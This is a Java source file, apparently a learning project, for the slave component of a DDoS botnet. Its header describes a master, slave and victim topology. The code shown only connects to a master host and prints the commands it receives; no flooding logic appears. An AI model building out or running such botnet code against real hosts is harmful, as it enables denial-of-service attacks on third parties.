/* Slave for ddos.
 *
 * Aruthor : Sitao Mei
 *
 * The ddos topolog was as below:
 * Master -   Slave  -  Target
 *          \        \   ...
 *           \        \ Traget
 *            \ Slave - -
 *  Desc :
 *  This is slave ,receive user commands from master to connect or dis-connect to Targets (victims) via commands.
 */

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.*;
import java.net.*;
import java.text.*;

public class SlaveBot {

    BufferedReader reader;
    /* master attributes
     * belonging master's hostname and port.
     */
    static String host_m ="MasterBot" ;
    static int srcPort_m = 0;

    /* main
     *Input  : user cmd from master
     *         1) connect ;
     *         2) disconnect;
     */
    public static void main(String[] args){

        //Receive "-p" option for master port.
        String iparam_0 = args[0] ;
        String iparam_1 = args[2] ;
        if ( args.length != 4 ) {
            System.out.println("Ilegal Parameter set; You should input format: SlaveBot -h <ip|hostname> -p <srcPort>");
            System.exit(1);
        }
        if ( !iparam_0.equalsIgnoreCase("-h") ){
            System.out.println("Invalid Parameter : " + iparam_0 + " ; You should input format: SlaveBot -h <ip|hostname> -p <srcPort>");
            System.exit(1);
        }
        if ( !iparam_1.equalsIgnoreCase("-p") ){
            System.out.println("Invalid Parameter : " + iparam_1 + " ; You should input format: SlaveBot -h <ip|hostname> -p <srcPort>");
            System.exit(1);
        }

        //Retrieve parameters from command's parameters
        try {
            host_m = args[1];
            srcPort_m = Integer.parseInt(args[3]);
            System.out.println("Slave to master : "+ host_m + ", " +srcPort_m);
        }
        catch (NumberFormatException Nfe){
            System.out.println("Invalid parameter srcPort, You should input format: SlaveBot -h <ip|hostname> -p/P <srcPort>");
            System.exit(1);
        }
        //Call method go.
        SlaveBot slave = new SlaveBot();
        slave.go();
    } // close main

    /* method : go
     * Parse incoming commands and call corresponding methods.
     * Scanner : to read in cmd line from console.
     */
    public void go() {
        //Display ">" in terminal and create server socket.
        try {
            InetAddress addr_m = InetAddress.getByName(host_m);
            Socket sock = new Socket(addr_m,srcPort_m);
            System.out.println("Slave: connect to "+addr_m+","+srcPort_m);

            InputStreamReader instreamreader = new InputStreamReader(sock.getInputStream());
            reader = new BufferedReader(instreamreader);

            //While loop waiting for commands.
            String message=null;
            while (true){
                if ( (message = reader.readLine()) != null ) {
                    System.out.println("Slave received host command : "+message);
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            System.exit(1);
        }
    } // close method go

} //close class MaterBot
